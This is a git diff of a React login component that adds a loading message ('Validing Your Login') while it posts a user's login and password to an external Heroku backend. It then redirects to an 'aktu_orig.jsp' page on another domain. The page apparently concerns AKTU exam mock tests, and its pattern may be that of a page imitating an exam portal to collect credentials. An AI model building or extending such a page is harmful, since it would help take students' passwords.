@@ -4,6 +4,7 @@ function Login() {
     const [login, setLogin] = useState('');
     const [password, setPassword] = useState('');
     const [show, setShow] = useState(false);
+    const [msg, setMsg] = useState('');
 
     const handleClick=(e)=>{
         e.preventDefault();
@@ -20,17 +21,18 @@ function Login() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(reqBody)
         };
+        setMsg('Validing Your Login');
 
         fetch('https://aktudata-backend.herokuapp.com/login', requestOptions)
         .then(response => response.json())
         .then(data => {
             console.log(data);
+            setMsg('')
             if(data.status === 200){
                 window.location = "https://aktuexam.in/LOGIN-2/aktu_orig.jsp";
-
             }else{
                 console.log('try again');
-            }
+            }  
         });
 
     }
@@ -46,6 +48,7 @@ function Login() {
                 <input onClick={() => handleClick} type="submit" name="submitButton" id="submitButton" className="form-control btn btn-login" value="Continue"></input>
   
             </form>
+                <span className="loading-error">{msg}</span>
             <div className="text-body">
                 <div className="msg">
                     Since the final exams have started, mock test will be open from 6 pm to 7 am every Exam day चूंकि परीक्षाएं शुरू हो गई हैं, इसलिए मॉक टेस्ट रोजाना शाम 6 बजे से अगले दिन सुबह 7 बजे तक ही खुला रहेगा (परीक्षा की तिथि में)
